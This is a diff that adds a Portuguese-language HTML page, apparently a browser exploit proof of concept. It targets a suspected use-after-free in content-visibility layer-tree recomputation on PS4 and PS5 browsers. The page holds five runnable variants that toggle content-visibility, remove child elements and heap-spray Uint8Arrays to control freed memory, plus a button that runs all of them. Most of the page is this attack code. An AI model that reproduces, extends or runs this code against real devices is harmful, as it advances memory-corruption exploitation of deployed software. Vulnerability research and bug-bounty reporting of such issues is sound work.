@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>UAF content-visibility PoC (Dark-life944)</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:#0a0800; color:#e0e0e0; font-family:'Courier New',monospace; padding:16px; font-size:12px; }
+h1 { color:#ff8800; font-size:14px; margin-bottom:2px; }
+.meta { color:#555; font-size:10px; margin-bottom:8px; }
+.warning { background:#1a0500; border:2px solid #ff4400; border-radius:5px; padding:10px; margin-bottom:12px; font-size:11px; color:#ff9966; line-height:1.6; }
+.info { background:#110a00; border:1px solid #332200; border-radius:5px; padding:10px; margin-bottom:12px; font-size:11px; color:#cc9966; line-height:1.6; }
+.source-box { background:#060606; border:1px solid #1a1a00; border-radius:5px; padding:10px; margin-bottom:12px; font-size:10px; color:#888844; line-height:1.8; font-family:monospace; }
+#log { background:#0a0a12; border:1px solid #1a1a2a; border-radius:5px; padding:10px; min-height:200px; white-space:pre; overflow-y:auto; max-height:400px; font-size:11px; line-height:1.6; }
+.ok{color:#44ff88}.warn{color:#ffaa00}.err{color:#ff4444}.info2{color:#4488ff}.sep{color:#222}
+.btn { display:inline-block; margin-top:10px; margin-right:6px; padding:7px 14px; background:#110800; border:1px solid #442200; border-radius:4px; color:#cc7700; cursor:pointer; font-family:'Courier New',monospace; font-size:11px; }
+.btn:hover { border-color:#ff8800; color:#ffaa00; }
+.back { display:inline-block; margin-top:10px; padding:7px 14px; background:#0d0d18; border:1px solid #222; border-radius:4px; color:#666; text-decoration:none; font-size:11px; }
+
+/* Elemento alvo do exploit */
+.container { width:100px; height:100px; background:#111; margin:10px 0; }
+.child { width:60px; height:60px; background:#004488; }
+</style>
+</head>
+<body>
+<h1>🔴 UAF — content-visibility Layer Tree (Dark-life944/poc)</h1>
+<p class="meta">Sem CVE formal · PS4/PS5 target explícito · Possível 0-day · github.com/Dark-life944/poc</p>
+
+<div class="warning">
+  ⚠️ <strong>ALVO PRIORITÁRIO:</strong> Este PoC é baseado diretamente no repositório público
+  <code>github.com/Dark-life944/poc</code> que menciona PS4/PS5 como targets intencionais.
+  <strong>Se o navegador fechar/crashar</strong> após qualquer fase: bug CONFIRMADO — documente e reporte ao Bug Bounty.
+</div>
+
+<div class="info">
+  <strong style="color:#ff8800">Mecanismo Original (Dark-life944):</strong><br>
+  1. Define <code>content-visibility: hidden</code> no container pai → altera o layer tree<br>
+  2. Remove o elemento filho → libera memória associada ao layer<br>
+  3. Restaura <code>content-visibility: auto</code> → dispara recomputação do layer tree<br>
+  4. Heap spray com Uint8Array para controlar a memória liberada<br>
+  5. MutationObserver re-dispara o UAF ao detectar mudanças<br><br>
+  <strong>Variantes adicionais neste PoC:</strong> Múltiplos filhos, CSS animations simultâneas, e will-change spray.
+</div>
+
+<div class="source-box">
+<strong style="color:#aaaa44">// Lógica central extraída do repositório Dark-life944/poc:</strong>
+container.style['content-visibility'] = 'hidden';  // altera layer tree
+container.removeChild(child);                        // libera memória associada
+setTimeout(function() {
+  container.style['content-visibility'] = 'auto';  // recomputa layer tree → UAF
+  // heap spray para controlar memória liberada:
+  for (var i = 0; i &lt; 1000; i++) spray.push(new Uint8Array(1024));
+}, 100);
+</div>
+
+<!-- Elemento alvo -->
+<div class="container" id="main-container">
+  <div class="child" id="main-child"></div>
+</div>
+
+<div id="log">Aguardando execução...\n</div>
+
+<div>
+  <button class="btn" onclick="pocOriginal()">① PoC Original (Dark-life944)</button>
+  <button class="btn" onclick="pocMultiChild()">② Variante Multi-Filhos</button>
+  <button class="btn" onclick="pocAnimationRace()">③ Variante CSS Animation</button>
+  <button class="btn" onclick="pocWillChange()">④ Variante will-change Spray</button>
+  <button class="btn" onclick="pocMutationLoop()">⑤ MutationObserver Loop</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+
+<script>
+var L = document.getElementById('log');
+function l(m,c){ L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n'; L.scrollTop=L.scrollHeight; }
+function sep(t){ l('─── '+(t||'')+' ───────────────────','sep'); }
+
+// ────────────────────────────────────────────────
+// PoC 1: ORIGINAL Dark-life944 — implementação fiel
+// ────────────────────────────────────────────────
+function pocOriginal() {
+  sep('PoC Original (Dark-life944/poc)');
+  l('Executando UAF content-visibility (lógica original)...','warn');
+  l('AVISO: crash aqui = bug confirmado no PS4!','warn');
+
+  // Verifica suporte a content-visibility
+  var testEl = document.createElement('div');
+  testEl.style['content-visibility'] = 'hidden';
+  if (!testEl.style['content-visibility']) {
+    l('content-visibility NÃO SUPORTADO — CVE não testável','warn');
+    return;
+  }
+  l('content-visibility suportado ✓','ok');
+
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'width:100px;height:100px;background:#111;';
+    var child = document.createElement('div');
+    child.style.cssText = 'width:60px;height:60px;background:#004488;';
+    container.appendChild(child);
+    document.body.appendChild(container);
+
+    var spray = [];
+
+    // STEP 1: Altera layer tree
+    l('STEP 1: content-visibility = hidden (altera layer tree)...','info2');
+    container.style['content-visibility'] = 'hidden';
+
+    // STEP 2: Remove filho (libera memória do layer)
+    l('STEP 2: removeChild (libera memória associada ao layer)...','info2');
+    container.removeChild(child);
+
+    // STEP 3: Após delay, recomputa layer tree → trigger UAF
+    setTimeout(function() {
+      l('STEP 3: content-visibility = auto (trigger recomputação UAF)...','warn');
+      container.style['content-visibility'] = 'auto';
+
+      // Heap spray para controlar memória liberada
+      for (var i = 0; i < 1000; i++) {
+        spray.push(new Uint8Array(1024));
+        if (i < 10) spray[i].fill(0x41); // preenche com 'A'
+      }
+      l('Heap spray: 1000 x 1KB injetados','ok');
+
+      // Força reflow após o trigger
+      var _ = container.offsetHeight;
+
+      setTimeout(function() {
+        if (container.parentNode) document.body.removeChild(container);
+        spray = [];
+        l('PoC Original concluído sem crash — feature protegida ou não aplicável','ok');
+      }, 500);
+
+    }, 100);
+
+  } catch(e) {
+    l('EXCEÇÃO: '+e.name+' — '+e.message,'err');
+  }
+}
+
+// ────────────────────────────────────────────────
+// PoC 2: Variante com múltiplos filhos
+// ────────────────────────────────────────────────
+function pocMultiChild() {
+  sep('Variante Multi-Filhos');
+  l('UAF com múltiplos filhos removidos simultaneamente...','warn');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'width:200px;height:200px;';
+    var children = [];
+    for (var i = 0; i < 10; i++) {
+      var c = document.createElement('div');
+      c.style.cssText = 'width:20px;height:20px;float:left;background:hsl('+i*36+',70%,50%);';
+      container.appendChild(c);
+      children.push(c);
+    }
+    document.body.appendChild(container);
+
+    container.style['content-visibility'] = 'hidden';
+
+    // Remove todos os filhos
+    children.forEach(function(c) {
+      if (c.parentNode) container.removeChild(c);
+    });
+
+    setTimeout(function() {
+      container.style['content-visibility'] = 'auto';
+
+      // Spray maior para múltiplos layers
+      var spray = [];
+      for (var i = 0; i < 2000; i++) spray.push(new Uint8Array(512));
+
+      container.offsetHeight;
+      setTimeout(function() {
+        if (container.parentNode) document.body.removeChild(container);
+        spray = null;
+        l('Multi-filho: concluído sem crash','ok');
+      }, 300);
+    }, 50);
+  } catch(e) { l('EXCEÇÃO: '+e.name+' — '+e.message,'err'); }
+}
+
+// ────────────────────────────────────────────────
+// PoC 3: Variante com CSS Animation durante UAF
+// ────────────────────────────────────────────────
+function pocAnimationRace() {
+  sep('Variante CSS Animation Race');
+  l('UAF com animação CSS ativa durante layer tree recompute...','warn');
+  try {
+    var styleEl = document.createElement('style');
+    styleEl.textContent = '@keyframes pulse { 0%{opacity:1;transform:scale(1)} 50%{opacity:.5;transform:scale(1.5)} 100%{opacity:1;transform:scale(1)} }';
+    document.head.appendChild(styleEl);
+
+    var container = document.createElement('div');
+    container.style.cssText = 'width:100px;height:100px;will-change:transform;';
+    var child = document.createElement('div');
+    child.style.cssText = 'width:50px;height:50px;background:blue;animation:pulse 0.1s infinite;';
+    container.appendChild(child);
+    document.body.appendChild(container);
+
+    // Inicia layer tree change durante animação
+    container.style['content-visibility'] = 'hidden';
+
+    requestAnimationFrame(function() {
+      container.removeChild(child); // Remove durante frame de animação
+
+      requestAnimationFrame(function() {
+        container.style['content-visibility'] = 'auto';
+
+        var spray = [];
+        for (var i = 0; i < 1500; i++) spray.push(new Uint8Array(768));
+
+        setTimeout(function() {
+          if (container.parentNode) document.body.removeChild(container);
+          if (styleEl.parentNode) document.head.removeChild(styleEl);
+          spray = null;
+          l('Animation Race: concluído sem crash','ok');
+        }, 300);
+      });
+    });
+    l('Animation race iniciado...','info2');
+  } catch(e) { l('EXCEÇÃO: '+e.name+' — '+e.message,'err'); }
+}
+
+// ────────────────────────────────────────────────
+// PoC 4: will-change spray + content-visibility
+// ────────────────────────────────────────────────
+function pocWillChange() {
+  sep('Variante will-change Spray');
+  l('UAF com spray de will-change layers...','warn');
+  try {
+    var containers = [];
+    var children_refs = [];
+
+    // Cria muitos containers com will-change (força layer creation)
+    for (var i = 0; i < 30; i++) {
+      var c = document.createElement('div');
+      c.style.cssText = 'width:10px;height:10px;will-change:transform;position:absolute;left:'+(i*10)+'px;';
+      var ch = document.createElement('div');
+      ch.style.cssText = 'width:5px;height:5px;background:red;will-change:opacity;';
+      c.appendChild(ch);
+      document.body.appendChild(c);
+      containers.push(c);
+      children_refs.push(ch);
+    }
+
+    // Trigger em todos simultaneamente
+    containers.forEach(function(c) { c.style['content-visibility'] = 'hidden'; });
+    children_refs.forEach(function(ch) {
+      if (ch.parentNode) ch.parentNode.removeChild(ch);
+    });
+
+    setTimeout(function() {
+      containers.forEach(function(c) { c.style['content-visibility'] = 'auto'; });
+
+      var spray = [];
+      for (var i = 0; i < 3000; i++) spray.push(new Uint8Array(256));
+
+      setTimeout(function() {
+        containers.forEach(function(c) { if (c.parentNode) document.body.removeChild(c); });
+        spray = null;
+        l('will-change spray: 30 containers, concluído sem crash','ok');
+      }, 300);
+    }, 50);
+  } catch(e) { l('EXCEÇÃO: '+e.name+' — '+e.message,'err'); }
+}
+
+// ────────────────────────────────────────────────
+// PoC 5: MutationObserver loop (Dark-life944 feature)
+// ────────────────────────────────────────────────
+function pocMutationLoop() {
+  sep('MutationObserver Loop (Dark-life944 feature)');
+  l('UAF re-disparado via MutationObserver...','warn');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'width:100px;height:100px;';
+    document.body.appendChild(container);
+    var triggerCount = 0;
+    var maxTriggers = 5;
+    var spray = [];
+
+    var observer = new MutationObserver(function(mutations) {
+      if (triggerCount >= maxTriggers) {
+        observer.disconnect();
+        if (container.parentNode) document.body.removeChild(container);
+        spray = null;
+        l('MutationObserver Loop: '+triggerCount+' triggers, sem crash','ok');
+        return;
+      }
+      triggerCount++;
+      l('MutationObserver trigger #'+triggerCount,'info2');
+
+      // Re-executa o UAF pattern
+      var child = document.createElement('div');
+      child.style.cssText = 'width:50px;height:50px;background:green;';
+      container.appendChild(child);
+
+      container.style['content-visibility'] = 'hidden';
+      setTimeout(function() {
+        if (child.parentNode) container.removeChild(child);
+        setTimeout(function() {
+          container.style['content-visibility'] = 'auto';
+          for (var i = 0; i < 200; i++) spray.push(new Uint8Array(512));
+        }, 30);
+      }, 30);
+    });
+
+    observer.observe(container, { childList: true, subtree: true, attributes: true });
+
+    // Trigger inicial
+    var initChild = document.createElement('div');
+    container.appendChild(initChild);
+    l('MutationObserver loop iniciado ('+maxTriggers+' triggers)...','info2');
+  } catch(e) { l('EXCEÇÃO: '+e.name+' — '+e.message,'err'); }
+}
+
+function runAll() {
+  L.innerHTML='';
+  l('▶ TODOS OS TESTES UAF content-visibility','warn');
+  l('ATENÇÃO: qualquer crash = bug confirmado no PS4!','warn');
+  setTimeout(function(){ pocOriginal(); }, 100);
+  setTimeout(function(){ pocMultiChild(); }, 1200);
+  setTimeout(function(){ pocAnimationRace(); }, 2400);
+  setTimeout(function(){ pocWillChange(); }, 3500);
+  setTimeout(function(){ pocMutationLoop(); }, 4500);
+}
+</script>
+</body>
+</html>
